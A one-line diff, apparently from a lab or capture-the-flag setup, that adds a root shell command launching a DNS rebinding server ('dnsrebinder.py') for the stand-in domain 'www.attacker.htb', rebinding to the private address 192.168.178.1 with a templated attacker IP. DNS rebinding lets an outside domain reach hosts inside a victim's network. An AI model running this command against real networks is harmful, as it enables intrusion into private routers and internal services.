@@ -1,0 +1,1 @@
+sudo python3 dnsrebinder.py --domain www.attacker.htb. --rebind 192.168.178.1 --ip <%=$(esh variables/attacker_ip)%> --counter 1 --tcp --udp
